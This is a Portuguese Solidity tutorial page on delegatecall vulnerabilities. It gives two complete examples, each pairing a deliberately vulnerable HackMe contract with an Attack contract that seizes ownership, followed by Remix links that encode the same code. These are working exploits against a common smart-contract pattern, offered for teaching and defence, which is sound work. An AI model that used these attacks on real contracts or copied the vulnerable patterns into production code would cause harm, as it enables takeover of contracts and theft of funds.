# Delegatecall

</h4><a href="#vulnerability" id="vulnerability">Vulnerabilidade</a></h4>

`delegatecall` é complicado de usar e seu uso errado ou entendimento incorreto pode levar a resultados devastadores.

Você deve ter 2 coisas em mente quando usar o `delegatecall`

1. `delegatecall` preserva o contexto (armazenagem, chamador etc...)
2. O layout de armazenamento deve ser o mesmo para a chamada do contrato `delegatecall` e do contrato que está sendo chamado.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
HackMe é um contrato que usa delegatecall para executar código.
Não é evidente que o proprietário do HackMe pode ser mudado já que não há
função dentro HackMe para fazer isso. Contudo um invasor pode roubar o
contrato para explorar delegatecall. Vejamos como.

1. Alice implanta Lib
2. Alice implementa HackMe com endereço do Lib
3. Eve implementa Attack com endereço do HackMe
4. Eve chama Attack.attack()
5. Attack é agora o proprietário do HackMe

O que aconteceu?
Eve chamou Attack.attack().
Attack chamou a função fallback do HackMe enviando o seletor de função
do pwn(). HackMe encaminha a chamada para o Lib usando delegatecall.
Aqui msg.data contém o seletor de função do pwn().
Isso avisa ao Solidity para chamar a função pwn() dentro do Lib.
A função pwn() atualiza o proprietário para msg.sender.
Delegatecall roda o código do Lib usando o contexto do HackMe.
Consequentemente a armazenagem do HackMe foi atualizada para msg.sender onde
msg.sender é o chamador do HackMe, nesse caso, Attack.
*/

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract HackMe {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Attack {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}
```

Aqui está outro exemplo.

Você precisará entender como o Solidity armazena as variáveis ​​de estado antes de entender essa exploração.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
Esta é uma versão mais sofisticada do exploit anterior.

1. Alice implanta Lib e HackMe com endereço do Lib
2. Eve implanta Attack com endereço do HackMe
3. Eve chama Attack.attack()
4. Attack agora é o proprietário do HackMe

O que aconteceu?
Observe que as variáveis de estado não estão definidas da mesma forma no Lib
e HackMe. Isso significa que chamando Lib.doSomething() muda a primeira
variável de estado dentro do HackMe, que acontece que é o endereço do lib.

Dentro do attack(), a primeira chamada para doSomething() muda o endereço do lib
armazenado no HackMe. O endereço do lib agora está configurado para o Attack.
A segunda chamada para doSomething() chama Attack.doSomething() e aqui temos
a mudança do proprietário.
*/

contract Lib {
    uint public someNumber;

    function doSomething(uint _num) public {
        someNumber = _num;
    }
}

contract HackMe {
    address public lib;
    address public owner;
    uint public someNumber;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract Attack {
    // Certifique-se de que o layout de armazanagem é o mesmo que o do HackMe
    // Isso permitirá a atualização correta das variáveis de estado
    address public lib;
    address public owner;
    uint public someNumber;

    HackMe public hackMe;

    constructor(HackMe _hackMe) {
        hackMe = HackMe(_hackMe);
    }

    function attack() public {
        // substitui o endereço do lib
        hackMe.doSomething(uint(uint160(address(this))));
        // passa qualquer número como entrada, a função doSomething() abaixo
        // será chamada
        hackMe.doSomething(1);
    }

    // a assinatura da função deve corresponder à da HackMe.doSomething()
    function doSomething(uint _num) public {
        owner = msg.sender;
    }
}
```

</h4><a href="#preventative-techniques" id="preventative-techniques">Técnicas preventivas</a></h4>

- Usar sem estado `Library`

## Teste no Remix

- [Delegatecall_1.sol](https://remix.ethereum.org/#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yMDsKCi8qCkhhY2tNZSBlIHVtIGNvbnRyYXRvIHF1ZSB1c2EgZGVsZWdhdGVjYWxsIHBhcmEgZXhlY3V0YXIgY29kaWdvLgpOYW8gZSBldmlkZW50ZSBxdWUgbyBwcm9wcmlldGFyaW8gZG8gSGFja01lIHBvZGUgc2VyIG11ZGFkbyBqYSBxdWUgbmFvIGhhIApmdW5jYW8gZGVudHJvIEhhY2tNZSBwYXJhIGZhemVyIGlzc28uIENvbnR1ZG8gdW0gaW52YXNvciBwb2RlIHJvdWJhciBvCmNvbnRyYXRvIHBhcmEgZXhwbG9yYXIgZGVsZWdhdGVjYWxsLiBWZWphbW9zIGNvbW8uCgoxLiBBbGljZSBpbXBsYW50YSBMaWIKMi4gQWxpY2UgaW1wbGVtZW50YSBIYWNrTWUgY29tIGVuZGVyZWNvIGRvIExpYgozLiBFdmUgaW1wbGVtZW50YSBBdHRhY2sgY29tIGVuZGVyZWNvIGRvIEhhY2tNZQo0LiBFdmUgY2hhbWEgQXR0YWNrLmF0dGFjaygpCjUuIEF0dGFjayBlIGFnb3JhIG8gcHJvcHJpZXRhcmlvIGRvIEhhY2tNZQoKTyBxdWUgYWNvbnRlY2V1PwpFdmUgY2hhbW91IEF0dGFjay5hdHRhY2soKS4KQXR0YWNrIGNoYW1vdSBhIGZ1bmNhbyBmYWxsYmFjayBkbyBIYWNrTWUgZW52aWFuZG8gbyBzZWxldG9yIGRlIGZ1bmNhbwpkbyBwd24oKS4gSGFja01lIGVuY2FtaW5oYSBhIGNoYW1hZGEgcGFyYSBvIExpYiB1c2FuZG8gZGVsZWdhdGVjYWxsLgpBcXVpIG1zZy5kYXRhIGNvbnRlbSBvIHNlbGV0b3IgZGUgZnVuY2FvIGRvIHB3bigpLgpJc3NvIGF2aXNhIGFvIFNvbGlkaXR5IHBhcmEgY2hhbWFyIGEgZnVuY2FvIHB3bigpIGRlbnRybyBkbyBMaWIuCkEgZnVuY2FvIHB3bigpIGF0dWFsaXphIG8gcHJvcHJpZXRhcmlvIHBhcmEgbXNnLnNlbmRlci4KRGVsZWdhdGVjYWxsIHJvZGEgbyBjb2RpZ28gZG8gTGliIHVzYW5kbyBvIGNvbnRleHRvIGRvIEhhY2tNZS4KQ29uc2VxdWVudGVtZW50ZSBhIGFybWF6ZW5hZ2VtIGRvIEhhY2tNZSBmb2kgYXR1YWxpemFkYSBwYXJhIG1zZy5zZW5kZXIgb25kZSAKbXNnLnNlbmRlciBlIG8gY2hhbWFkb3IgZG8gSGFja01lLCBuZXNzZSBjYXNvLCBBdHRhY2suCiovCgpjb250cmFjdCBMaWIgewogICAgYWRkcmVzcyBwdWJsaWMgb3duZXI7CgogICAgZnVuY3Rpb24gcHduKCkgcHVibGljIHsKICAgICAgICBvd25lciA9IG1zZy5zZW5kZXI7CiAgICB9Cn0KCmNvbnRyYWN0IEhhY2tNZSB7CiAgICBhZGRyZXNzIHB1YmxpYyBvd25lcjsKICAgIExpYiBwdWJsaWMgbGliOwoKICAgIGNvbnN0cnVjdG9yKExpYiBfbGliKSB7CiAgICAgICAgb3duZXIgPSBtc2cuc2VuZGVyOwogICAgICAgIGxpYiA9IExpYihfbGliKTsKICAgIH0KCiAgICBmYWxsYmFjaygpIGV4dGVybmFsIHBheWFibGUgewogICAgICAgIGFkZHJlc3MobGliKS5kZWxlZ2F0ZWNhbGwobXNnLmRhdGEpOwogICAgfQp9Cgpjb250cmFjdCBBdHRhY2sgewogICAgYWRkcmVzcyBwdWJsaWMgaGFja01lOwoKICAgIGNvbnN0cnVjdG9yKGFkZHJlc3MgX2hhY2tNZSkgewogICAgICAgIGhhY2tNZSA9IF9oYWNrTWU7CiAgICB9CgogICAgZnVuY3Rpb24gYXR0YWNrKCkgcHVibGljIHsKICAgICAgICBoYWNrTWUuY2FsbChhYmkuZW5jb2RlV2l0aFNpZ25hdHVyZSgicHduKCkiKSk7CiAgICB9Cn0=&version=soljson-v0.8.20+commit.a1b79de6.js)
- [Delegatecall_2.sol](https://remix.ethereum.org/#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yMDsKCi8qCkVzdGEgZSB1bWEgdmVyc2FvIG1haXMgc29maXN0aWNhZGEgZG8gZXhwbG9pdCBhbnRlcmlvci4KCjEuIEFsaWNlIGltcGxhbnRhIExpYiBlIEhhY2tNZSBjb20gZW5kZXJlY28gZG8gTGliCjIuIEV2ZSBpbXBsYW50YSBBdHRhY2sgY29tIGVuZGVyZWNvIGRvIEhhY2tNZQozLiBFdmUgY2hhbWEgQXR0YWNrLmF0dGFjaygpCjQuIEF0dGFjayBhZ29yYSBlIG8gcHJvcHJpZXRhcmlvIGRvIEhhY2tNZQoKTyBxdWUgYWNvbnRlY2V1PwpPYnNlcnZlIHF1ZSBhcyB2YXJpYXZlaXMgZGUgZXN0YWRvIG5hbyBlc3RhbyBkZWZpbmlkYXMgZGEgbWVzbWEgZm9ybWEgbm8gTGliCmUgSGFja01lLiBJc3NvIHNpZ25pZmljYSBxdWUgY2hhbWFuZG8gTGliLmRvU29tZXRoaW5nKCkgbXVkYSBhIHByaW1laXJhIAp2YXJpYXZlbCBkZSBlc3RhZG8gZGVudHJvIGRvIEhhY2tNZSwgcXVlIGFjb250ZWNlIHF1ZSBlIG8gZW5kZXJlY28gZG8gbGliLgoKRGVudHJvIGRvIGF0dGFjaygpLCBhIHByaW1laXJhIGNoYW1hZGEgcGFyYSBkb1NvbWV0aGluZygpIG11ZGEgbyBlbmRlcmVjbyBkbyBsaWIKYXJtYXplbmFkbyBubyBIYWNrTWUuIE8gZW5kZXJlY28gZG8gbGliIGFnb3JhIGVzdGEgY29uZmlndXJhZG8gcGFyYSBvIEF0dGFjay4KQSBzZWd1bmRhIGNoYW1hZGEgcGFyYSBkb1NvbWV0aGluZygpIGNoYW1hIEF0dGFjay5kb1NvbWV0aGluZygpIGUgYXF1aSB0ZW1vcwphIG11ZGFuY2EgZG8gcHJvcHJpZXRhcmlvLgoqLwoKY29udHJhY3QgTGliIHsKICAgIHVpbnQgcHVibGljIHNvbWVOdW1iZXI7CgogICAgZnVuY3Rpb24gZG9Tb21ldGhpbmcodWludCBfbnVtKSBwdWJsaWMgewogICAgICAgIHNvbWVOdW1iZXIgPSBfbnVtOwogICAgfQp9Cgpjb250cmFjdCBIYWNrTWUgewogICAgYWRkcmVzcyBwdWJsaWMgbGliOwogICAgYWRkcmVzcyBwdWJsaWMgb3duZXI7CiAgICB1aW50IHB1YmxpYyBzb21lTnVtYmVyOwoKICAgIGNvbnN0cnVjdG9yKGFkZHJlc3MgX2xpYikgewogICAgICAgIGxpYiA9IF9saWI7CiAgICAgICAgb3duZXIgPSBtc2cuc2VuZGVyOwogICAgfQoKICAgIGZ1bmN0aW9uIGRvU29tZXRoaW5nKHVpbnQgX251bSkgcHVibGljIHsKICAgICAgICBsaWIuZGVsZWdhdGVjYWxsKGFiaS5lbmNvZGVXaXRoU2lnbmF0dXJlKCJkb1NvbWV0aGluZyh1aW50MjU2KSIsIF9udW0pKTsKICAgIH0KfQoKY29udHJhY3QgQXR0YWNrIHsKICAgIC8vIENlcnRpZmlxdWUtc2UgZGUgcXVlIG8gbGF5b3V0IGRlIGFybWF6YW5hZ2VtIGUgbyBtZXNtbyBxdWUgbyBkbyBIYWNrTWUKICAgIC8vIElzc28gcGVybWl0aXJhIGEgYXR1YWxpemFjYW8gY29ycmV0YSBkYXMgdmFyaWF2ZWlzIGRlIGVzdGFkbwogICAgYWRkcmVzcyBwdWJsaWMgbGliOwogICAgYWRkcmVzcyBwdWJsaWMgb3duZXI7CiAgICB1aW50IHB1YmxpYyBzb21lTnVtYmVyOwoKICAgIEhhY2tNZSBwdWJsaWMgaGFja01lOwoKICAgIGNvbnN0cnVjdG9yKEhhY2tNZSBfaGFja01lKSB7CiAgICAgICAgaGFja01lID0gSGFja01lKF9oYWNrTWUpOwogICAgfQoKICAgIGZ1bmN0aW9uIGF0dGFjaygpIHB1YmxpYyB7CiAgICAgICAgLy8gc3Vic3RpdHVpIG8gZW5kZXJlY28gZG8gbGliCiAgICAgICAgaGFja01lLmRvU29tZXRoaW5nKHVpbnQodWludDE2MChhZGRyZXNzKHRoaXMpKSkpOwogICAgICAgIC8vIHBhc3NhIHF1YWxxdWVyIG51bWVybyBjb21vIGVudHJhZGEsIGEgZnVuY2FvIGRvU29tZXRoaW5nKCkgYWJhaXhvCiAgICAgICAgLy8gc2VyYSBjaGFtYWRhCiAgICAgICAgaGFja01lLmRvU29tZXRoaW5nKDEpOwogICAgfQoKICAgIC8vIGEgYXNzaW5hdHVyYSBkYSBmdW5jYW8gZGV2ZSBjb3JyZXNwb25kZXIgYSBkYSBIYWNrTWUuZG9Tb21ldGhpbmcoKQogICAgZnVuY3Rpb24gZG9Tb21ldGhpbmcodWludCBfbnVtKSBwdWJsaWMgewogICAgICAgIG93bmVyID0gbXNnLnNlbmRlcjsKICAgIH0KfQ==&version=soljson-v0.8.20+commit.a1b79de6.js)
